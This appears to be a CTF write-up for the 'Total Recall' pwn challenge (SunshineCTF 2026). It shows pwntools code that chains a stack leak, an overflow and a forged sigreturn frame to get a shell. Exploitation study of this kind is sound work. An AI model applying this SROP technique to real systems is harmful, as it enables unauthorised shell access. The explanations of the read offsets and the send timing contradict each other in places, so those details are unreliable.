---
title: "Total Recall"
description: "Total Recall (SunshineCTF 2026) is a statically linked, stripped x86-64 binary with essentially no code to reuse — but it leaks its own stack address and offers two full-chunk reads,…"
event: "sun"
category: "pwn"
categoryLabel: "Pwn"
tags: ["SunshineCTF 2026","pwn"]
date: "2026-10-22"
teammate: false
source: "sun/pwn/total-recall/writeup.md"
---

Total Recall (SunshineCTF 2026) is a statically linked, stripped x86-64 binary with essentially no code to reuse — but it leaks its own stack address and offers two full-chunk reads, which is enough to build a ret2syscall through a SROP frame and get a shell. I solved it with a two-stage pwntools script.

## Summary

The binary is tiny. Its runtime does three useful things in sequence: push `rsp` and `write()` it out (an 8-byte stack leak), then `read()` 24 bytes, then a second helper routine does `read(0, rsp-0x80, 0x400)` before returning. Neither chunk has stack protection worth considering, and there are no libc gadgets — it is a pure "supply your own syscalls" target. The second read is the attack primitive: it reads `0x400` bytes into a buffer whose return address sits at offset `0x80`.

## The Gadgets

From the disassembly (`objdump -d`, statically linked, amd64):

```text
401016: push rsp; mov rsi, rsp; mov rdi, 1; mov rdx, 8; mov rax, 1; syscall   # leak
401031: pop rax; lea rsi, [rsp-0x40]; mov rdi, 0; mov rdx, 0x18; mov rax, 0; syscall
40104e: ret
40104f: lea rsi, [rsp-0x80]; mov rdi, 0; mov rdx, 0x400; mov rax, 0; syscall   # big read
40106b: ret
```

Two addresses become the entire ROP:

- `READ = 0x40104F` — the entry of the second read helper, reachable as a return target.
- `SYSCALL_RET = 0x401069` — the raw `syscall` instruction inside that helper, used as a semi-arbitrary "execute whatever is in the registers" primitive.

The leak is 8 bytes of pushed `rsp`; the receive buffer starts 0x80 below it, so `buf = leak - 0x80` translates leak to attack-buffer precisely:

```python
leak = u64(io.recvn(8))
buf = leak - 0x80
```

## The Chain

The plan is textbook SROP: overflow the second read, set its return address to `READ` so the program re-enters a read, point the next return at `SYSCALL_RET`, and place a `SigreturnFrame` right after. The frame sets up `execve("/bin/sh", 0, 0)` with the syscall instruction as `rip`.

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = buf + bin_sh_offset
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_RET

overflow = flat(
    {
        RET_OFFSET: READ,          # return into the second read helper
        RET_OFFSET + 8: SYSCALL_RET,
        RET_OFFSET + 16: bytes(frame),
        bin_sh_offset: b"/bin/sh\x00",
    },
    filler=b"A",
    length=0x400,
)
```

Here `RET_OFFSET = 0x80` matches where the first read leaves its saved return address relative to the buffer, and `bin_sh_offset = 0x300` parks `/bin/sh` inside the frame payload.

## Timing the Reads

The first read consumes exactly 24 bytes, so the overflow payload cannot be split naively across sends — the kernel-socket buffering has to hand the whole `0x418`-byte blob through as one coalesced remainder for the `0x400` read. The comments in the solver explain the timing trick:

```python
# Coalescing these reads guarantees that the first read consumes exactly 24
# bytes and leaves the complete overflow ready for the second read.
io.send(b"B" * 24 + overflow)
sleep(0.2)

# The re-entered read returns 15, selecting rt_sigreturn at SYSCALL_RET.
io.send(b"C" * 15)
```

`sleep(0.2)` is what makes the two sends land as distinct TCP segments at the remote end; without it the kernel may coalesce them and the first read consumes too much. The 15 `C`s matter because the re-entered read's return value sits in `rax` — read returning 15 is precisely `SYS_rt_sigreturn`, so when control reaches `SYSCALL_RET` the register is already primed to `sigreturn` and load the forged frame.

## Exploit

```bash
python solve.py                # default remote chal.sunshinectf.games:26003
python solve.py LOCAL          # local binary
python solve.py CMD='cat flag' # non-interactive one-shot
```

## Flag

Flag: not recovered in the writeup. The script is set up for an interactive shell; no flag string is stored in the binary or the solver.
